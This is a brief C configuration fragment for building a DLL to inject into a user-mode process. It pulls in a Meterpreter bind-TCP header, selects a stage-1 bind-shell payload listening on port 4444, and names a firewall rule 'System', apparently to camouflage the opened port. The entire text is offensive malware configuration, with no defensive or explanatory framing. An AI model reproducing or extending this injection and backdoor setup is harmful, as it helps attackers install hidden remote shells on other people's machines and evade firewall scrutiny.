
/**
 * Payload that should use to build DLL for injection 
 * into the user-mode process.
 */
#include "meterpreter_bind_tcp.h"

#define PAYLOAD bind_tcp_stage_1

#define LISTEN_PORT 4444

#define FIREWALL_RULE_NAME "System"
